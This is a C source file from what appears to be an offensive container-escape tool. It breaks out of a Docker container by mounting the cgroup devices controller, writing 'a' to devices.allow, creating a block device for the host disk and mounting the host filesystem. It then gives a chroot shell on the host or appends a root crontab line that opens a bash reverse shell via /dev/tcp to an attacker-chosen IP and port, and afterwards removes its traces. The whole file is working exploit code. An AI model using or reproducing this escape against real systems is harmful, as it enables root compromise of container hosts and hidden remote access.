//
// Created by FlagT on 2022/6/25.
//

#include "devices_allow.h"
#include "../util/output.h"
#include <stdlib.h>
#include "../util/random_str.h"
#include "../util/custom_struts.h"
#include "../docker/dev.h"
#include <string.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <fcntl.h>
#include <sys/sysmacros.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/wait.h>
#include "../util/utils.h"

int reset_device_allow() {

}

void device_allow_clear_all() {
    char *replace_buffer = malloc(1024 * 1024 * sizeof(char));
    memset(replace_buffer, 0x00, 1024 * 1024);
    int recover_ret = 0;
    if (attack_info.attack_mode == REVERSE) {
        char *file_buffer = malloc(1024 * 1024 * sizeof(char));
        memset(file_buffer, 0x00, 1024 * 1024);
        read_file(device_allow_attack_info.crontab_path, file_buffer, O_RDONLY);
        replace_buffer = str_replace(file_buffer, device_allow_attack_info.exp, "");
        if (replace_buffer == NULL) {
            printf_wrapper(ERROR, "Get recover crontab content failed\n");
        }
        recover_ret = write_file(device_allow_attack_info.crontab_path, replace_buffer, O_WRONLY | O_TRUNC);
        if (recover_ret == -1) {
            printf_wrapper(ERROR, "Rewrite %s to clear exp failed\n", device_allow_attack_info.crontab_path);
        }
        free(file_buffer);
    }
    int remove_host_dev_file_ret = remove_file(device_allow_attack_info.host_dev_path);
    if (remove_host_dev_file_ret == -1) {
        printf_wrapper(ERROR, "Delete host dev file %s failed\n", device_allow_attack_info.host_dev_path);
    }
    int umount_host_filesystem_ret = umount(device_allow_attack_info.host_filesystem_mount_path);
    if (umount_host_filesystem_ret == -1) {
        printf_wrapper(ERROR, "Umount host filesystem %s failed\n",
                       device_allow_attack_info.host_filesystem_mount_path);
    }
    int umount_cgroup_ret = umount(device_allow_attack_info.mount_path);
    if (umount_cgroup_ret == -1) {
        printf_wrapper(ERROR, "Umount cgroup %s failed\n",
                       device_allow_attack_info.mount_path);
    }
    if (replace_buffer == NULL || recover_ret == -1 || remove_host_dev_file_ret == -1 ||
        umount_host_filesystem_ret == -1 || umount_cgroup_ret == -1) {
        printf_wrapper(ERROR, "Failed to clear attack related file\n");
    } else {
        printf_wrapper(INFO, "Already clear attack related files\n");
    }
    free(replace_buffer);
}

int device_allow_reverse() {
    char *crontab_path = malloc(1024 * sizeof(char));
    memset(crontab_path, 0x00, 1024);
    strcpy(crontab_path, device_allow_attack_info.host_filesystem_mount_path);
    strcat(crontab_path, "/etc/crontab");
    device_allow_attack_info.crontab_path = malloc(1024 * sizeof(char));
    memset(device_allow_attack_info.crontab_path, 0x00, 1024);
    strcpy(device_allow_attack_info.crontab_path, crontab_path);
    char *exp = malloc(2048 * sizeof(char));
    strcpy(exp, "*/1 * * * * root ");
    strcat(exp, "bash -c \"bash -i >& /dev/tcp/");
    strcat(exp, attack_info.ip);
    strcat(exp, "/");
    strcat(exp, attack_info.port);
    strcat(exp, " 0>&1\"\n");
    device_allow_attack_info.exp = malloc(2048 * sizeof(char));
    memset(device_allow_attack_info.exp, 0x00, 2048);
    strcpy(device_allow_attack_info.exp, exp);
    if (write_file(crontab_path, exp, O_WRONLY | O_APPEND) == -1) {
        printf_wrapper(ERROR, "Write %s failed\n", crontab_path);
        exit(EXIT_SUCCESS);
    } else {
        printf_wrapper(INFO, "Write exp to %s\n", crontab_path);
    }
    free(crontab_path);
    free(exp);
    printf_wrapper(INFO,
                   "If the crontab is executed successfully, it will reverse shell to specified address within 1 minute, the program will wait for a minute and then clean up the crontab\n");
    sleep(60);
    device_allow_clear_all();
    return 0;
}

int device_allow_shell() {
    printf_wrapper(INFO, "Chroot to %s\n", device_allow_attack_info.host_filesystem_mount_path);
    int fd = open(".", O_RDONLY);
    if (chroot(device_allow_attack_info.host_filesystem_mount_path) != 0) {
        printf_wrapper(ERROR, "Chroot to %s failed\n", device_allow_attack_info.host_filesystem_mount_path);
        return -1;
    }
    printf_wrapper(INFO,
                   "This shell just chroot to host filesystem and run sh not real host shell, you can write/read host file, call 'exit' quit shell\n");
    chdir("/");
    int pid = fork();
    if (!pid) {
        execvp("/bin/sh", NULL);
    }
    printf_wrapper(INFO, "New sh process pid: %d\n", pid);
    if (waitpid(pid, NULL, 0) <= 0) {
        printf("wait sh process exit failed\n");
    }
    if (fchdir(fd) < 0) {
        printf_wrapper(ERROR, "fchdir to container root failed\n");
    }
    close(fd);
    for (int x = 0; x < 1024; x++) {
        chdir("..");
    }
    chroot(".");
    device_allow_clear_all();
    return 0;
}


int escape_by_device_allow() {
    const int cgroup_path_random_length = 10;
    char mount_path[128] = "/tmp/tmp.";
    char *device_allow_path = malloc(512 * sizeof(char));
    printf_wrapper(INFO, "Start escape by device_allow\n");
    char *cgroup_path_random = malloc(cgroup_path_random_length + 1);
    rand_string(cgroup_path_random, cgroup_path_random_length);
    strcat(mount_path, cgroup_path_random);
    free(cgroup_path_random);
    struct stat st = {0};
    if (stat(mount_path, &st) == -1) {
        mkdir(mount_path, 0700);
    }
    printf_wrapper(INFO, "Cgroup devices controller mount path: %s\n", mount_path);
    if (mount("devices", mount_path, "cgroup", 0, "devices")) {
        printf_wrapper(ERROR, "Mount cgroup devices controller to %s failed\n", mount_path);
        return -1;
    }
    device_allow_attack_info.mount_path = malloc(128 * sizeof(char));
    memset(device_allow_attack_info.mount_path, 0x00, 128);
    strcpy(device_allow_attack_info.mount_path, mount_path);

    strcpy(device_allow_path, mount_path);
    strcat(device_allow_path, device_allow_attack_info.cgroup_id);
    strcat(device_allow_path, "/devices.allow");
    printf_wrapper(INFO, "Current docker devices.allow file path: %s\n", device_allow_path);
    device_allow_attack_info.device_allow_path = malloc(512 * sizeof(char));
    memset(device_allow_attack_info.device_allow_path, 0x00, 512);
    strcpy(device_allow_attack_info.device_allow_path, device_allow_path);
    printf_wrapper(INFO, "Write 'a' to %s\n", device_allow_path);
    if (write_file(device_allow_path, "a", O_WRONLY) != 0) {
        printf_wrapper(ERROR, "Write device_allow failed\n");
        return -1;
    }
    free(device_allow_path);

    get_host_dev_major_minor();
    printf_wrapper(INFO, "Host dev attribute info major: %d minor: %d fstype: %s\n", host_dev_attribute.major,
                   host_dev_attribute.minor, host_dev_attribute.fstype);
    char *host_dev_random = malloc(7 * sizeof(char));
    memset(host_dev_random, 0x00, 7);
    rand_string(host_dev_random, 6);
    char *host_dev_path = malloc(20 * sizeof(char));
    strcpy(host_dev_path, "/tmp/");
    strcat(host_dev_path, host_dev_random);
    printf_wrapper(INFO, "Create host filesystem block special file\n");
    if (mknodat(AT_FDCWD, host_dev_path, S_IFBLK | 0666, makedev(host_dev_attribute.major, host_dev_attribute.minor)) !=
        0) {
        printf_wrapper(ERROR, "CCreate host filesystem block special file failed\n");
        exit(EXIT_SUCCESS);
    }
    printf_wrapper(INFO, "Host filesystem block special file path: %s\n", host_dev_path);
    device_allow_attack_info.host_dev_path = malloc(20 * sizeof(char));
    memset(device_allow_attack_info.host_dev_path, 0x00, 20);
    strcpy(device_allow_attack_info.host_dev_path, host_dev_path);
    free(host_dev_random);
    char host_mount_path[128] = "/tmp/tmp.";
    char *host_dev_path_random = malloc(20 * sizeof(char));
    rand_string(host_dev_path_random, 20);
    strcat(host_mount_path, host_dev_path_random);
    free(host_dev_path_random);
    if (stat(host_mount_path, &st) == -1) {
        mkdir(host_mount_path, 0700);
    }

    printf_wrapper(INFO, "Mount host filesystem to docker\n");
    if (mount(host_dev_path, host_mount_path, host_dev_attribute.fstype, 0, NULL)) {
        printf_wrapper(ERROR, "Mount Host filesystem to %s failed\n", host_mount_path);
        return -1;
    }
    printf_wrapper(INFO, "Host filesystem mount path: %s\n", host_mount_path);
    device_allow_attack_info.host_filesystem_mount_path = (char *) malloc(256 * sizeof(char));
    memset(device_allow_attack_info.host_filesystem_mount_path, 0x00, 256);
    strcpy(device_allow_attack_info.host_filesystem_mount_path, host_mount_path);
    return 0;
}

